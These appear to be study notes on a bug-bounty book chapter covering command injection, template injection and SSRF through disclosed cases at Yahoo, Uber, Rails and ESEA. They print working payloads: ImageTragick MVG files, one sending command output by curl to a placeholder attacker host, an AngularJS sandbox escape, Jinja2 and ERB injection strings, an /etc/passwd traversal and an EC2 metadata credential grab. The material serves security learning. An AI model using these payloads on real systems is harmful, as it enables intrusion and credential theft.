# Ch 9 — RCE, Template Injection, SSRF

## Remote Code Execution / Command Injection

Input reaches `eval()` or `system()` unsanitized: `index.php?page=1;phpinfo()`.

**ImageMagick case (Polyvore/Yahoo, $2k)**: ImageTragick — filenames piped into `system()`: `convert 'https://x.com"|ls "-la' out.png`. Delivery via **MVG** (Magick Vector Graphics — IM's own format executes delegates):

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://evil/x"|ls "-la)'
pop graphic-context
```

Nahamsec's exfil variant — run `id`, POST output home:

```
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id | curl http://YOURIP:8080/ -d @- > /dev/null`'
```

Method: verify on a local IM install → upload `.mvg` as profile pic → command output arrives at your listener. *Takeaway: track CVEs; Yahoo had "patched" it wrong — a bad patch is still a bug.*

## Template Injection

Template engines render user input → expression evaluation. Severity depends on engine + sandbox; author's own `{{4*4}}` find was neutered by a 30-char/`()[]` filter — **verify what the engine actually permits before claiming RCE**.

- **Uber Angular CSTI** ($3k): `?q=wrtz{{7*7}}` → `wrtz49`. Angular sandbox isn't a security boundary; Kettle's escape: `{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}` → dev-account hijack potential. *Wappalyzer → AngularJS → `{{}}` everywhere.*
- **Uber riders SSTI** ($10k): profile-name `{{1+1}}` → rendered `2` **in the notification email** (page showed literal text). Escalated `{% for c in [1,2,3] %}{{c,c,c}}{% endfor %}` → Jinja2 eval → Python exec. *Takeaway: check EVERY render surface — page, email, SMS, PDF, invoices.*
- **Rails dynamic render** (CVE-2016-0752): `render params[:template]` — convention-over-config scans `RAILS_ROOT/app/views`, `RAILS_ROOT`, **and system root** → `%2f%2fpasswd` reads `/etc/passwd`; `<%25%3dls%25>` = `<%= ls %>` → RCE. *Rails URL convention `/controller/id` → fuzz template/action params.*

## SSRF

Server fetches attacker-chosen URLs — the victim is the server (vs CSRF's browser).

**ESEA case ($1k)**: `media_preview.php?url=` found via dork `site:play.esea.net ext:php`. Sequence:
1. `?url=http://ziot.org` → fails (expects image).
2. `?url=http://ziot.org/1.png` → works → confirmed fetch.
3. **Extension bypass**: `?url=http://ziot.org/?1.png` — `?` turns `1.png` into a query param → server fetches the HTML page anyway. (Also try `%00`, extra slashes.)
4. Escalate past "it's just SSRF": → `http://169.254.169.254/latest/meta-data/` — EC2 metadata: IAM role creds, user-data, network info. *Takeaway: don't report the first impact you see — Brett could have stopped at reflected XSS; the AWS metadata made it critical.*

**SSRF signals**: params named `url`, `uri`, `dest`, `redirect`, `feed`, `host`, `site`, `image`, `callback` that trigger server-side fetches (webhooks, importers, "preview", "proxy", RSS).

## Red flags recap

- File/URL params reaching fetchers/converters → SSRF, XXE, cmd-injection.
- `{{`/`${`/`<%=` echoes → template injection (engine fingerprint: `{{7*'7'}}` → `7777777` Jinja2 vs `49` Twig).
- Media processing (resize/convert) → library CVEs (ImageTragick pattern).
